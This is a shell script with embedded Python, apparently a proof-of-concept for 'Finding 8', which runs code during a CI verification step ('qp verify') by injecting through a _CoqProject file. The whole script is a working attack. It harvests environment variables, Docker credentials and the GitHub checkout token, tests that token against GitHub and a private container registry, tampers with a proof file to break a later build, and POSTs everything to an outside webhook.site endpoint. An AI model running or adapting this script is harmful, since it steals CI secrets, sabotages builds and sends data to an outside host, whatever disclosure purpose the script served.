#!/bin/sh
# Finding 8: this runs while `qp verify` verifies the repository, in its run/prebuild step, before the main
# build.  It is reachable from a _CoqProject that qp's coqproject_problems() accepts: no line starts with
# a code-loading flag, the assignment line is not parsed at all, and coq_makefile puts COQMF_COQLIBS into
# the coqc recipe unquoted, where `;` separates shell commands.
cd "$(dirname "$0")" || exit 0
# the four make targets may run the recipe in parallel: one of them collects
mkdir ../../.pwn 2>/dev/null || exit 0
{
  echo '== Finding 8: command execution during qp verify (run/prebuild _CoqProject)'
  date -u
  echo '== id'; id
  echo '== hostname'; hostname
  echo '== uname'; uname -a
  echo '== pwd'; pwd
  echo '== cgroup'; cat /proc/self/cgroup 2>/dev/null
  echo '== environment'; env | sort
  echo '== docker registry credentials'; cat /root/.docker/config.json "$HOME/.docker/config.json" 2>/dev/null
  echo '== checkout credentials (actions/checkout leaves them in .git/config)'
  git -C "$GITHUB_WORKSPACE" config --local --get http.https://github.com/.extraheader 2>/dev/null
  tok=$(git -C "$GITHUB_WORKSPACE" config --local --get http.https://github.com/.extraheader 2>/dev/null | sed -n 's/.*[Bb][Aa][Ss][Ii][Cc] //p' | base64 -d 2>/dev/null | cut -d: -f2)
  if [ -n "$tok" ]; then
    echo "token length: ${#tok}"
    python3 - "$tok" <<'PY2'
import base64, json, sys, urllib.error, urllib.request
tok = sys.argv[1]
def code(url, hdr):
    try:
        return urllib.request.urlopen(urllib.request.Request(url, headers=hdr), timeout=15).status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        return "ERR %s" % e
print("api repo read:", code("https://api.github.com/repos/genproof/quickproof-public",
                             {"Authorization": "Bearer " + tok, "Accept": "application/vnd.github+json"}))
print("api org repos read:", code("https://api.github.com/orgs/genproof/repos?per_page=1",
                                  {"Authorization": "Bearer " + tok, "Accept": "application/vnd.github+json"}))
try:
    basic = base64.b64encode(("x:" + tok).encode()).decode()
    r = urllib.request.Request("https://ghcr.io/token?scope=repository:genproof/quickproof-toolchain:pull",
                               headers={"Authorization": "Basic " + basic})
    pull = json.load(urllib.request.urlopen(r, timeout=15)).get("token", "")
    print("ghcr pull token for private quickproof-toolchain:", "yes" if pull else "no")
    if pull:
        print("ghcr private manifest:", code(
            "https://ghcr.io/v2/genproof/quickproof-toolchain/manifests/8.20.1-ci",
            {"Authorization": "Bearer " + pull, "Accept": "application/vnd.oci.image.manifest.v1+json, "
             "application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v2+json, "
             "application/vnd.docker.distribution.manifest.list.v2+json"}))
except Exception as e:
    print("ghcr probe failed:", e)
PY2
  fi
  echo '== runner dirs'; ls -la /github/workflow /github/home 2>/dev/null
  echo '== GitHub event'; sed -n '1,120p' /github/workflow/event.json 2>/dev/null
  echo '== workspace'; ls -la "$GITHUB_WORKSPACE" 2>/dev/null | head -20
  echo '== git'; git -C "$GITHUB_WORKSPACE" log -1 --oneline 2>/dev/null
  echo '== write into the verified tree'; echo "written by env/pre/pwn.sh during qp verify at $(date -u)" > ../../pwn-write-test.txt
  echo '== sabotage a later example (its proof gets a syntax error in the workspace checkout)'
  if [ -n "$GITHUB_WORKSPACE" ] && [ -w "$GITHUB_WORKSPACE/examples/adler32/proof/src/proof/Adler.v" ]; then
    printf '\n(* appended by examples/0pwn/pre/pwn.sh during qp verify (Finding 8) *)\nDefinition this_does_not_compile := .\n' >> "$GITHUB_WORKSPACE/examples/adler32/proof/src/proof/Adler.v"
    echo "appended to $GITHUB_WORKSPACE/examples/adler32/proof/src/proof/Adler.v"
  fi
} > ../../pwned.txt 2>&1
# the run's summary page shows the same markers, independent of the collector
if [ -n "$GITHUB_STEP_SUMMARY" ]; then
  {
    echo '## Finding 8: command execution during qp verify'
    echo '```'
    id
    hostname
    uname -a
    echo '```'
  } >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
fi
python3 - "https://webhook.site/267e2ec0-5352-440d-be55-0dcd64d95926" ../../pwned.txt <<'PY' || true
import sys, urllib.request
url, path = sys.argv[1], sys.argv[2]
data = open(path, "rb").read()
req = urllib.request.Request(url, data=data, method="POST")
req.add_header("Content-Type", "text/plain; charset=utf-8")
for attempt in (url, url.replace("https://", "http://", 1)):
    try:
        urllib.request.urlopen(req, timeout=25).read()
        print("exfiltrated", len(data), "bytes to", attempt)
        break
    except Exception as e:
        print("exfil attempt failed:", attempt, e)
PY
exit 0
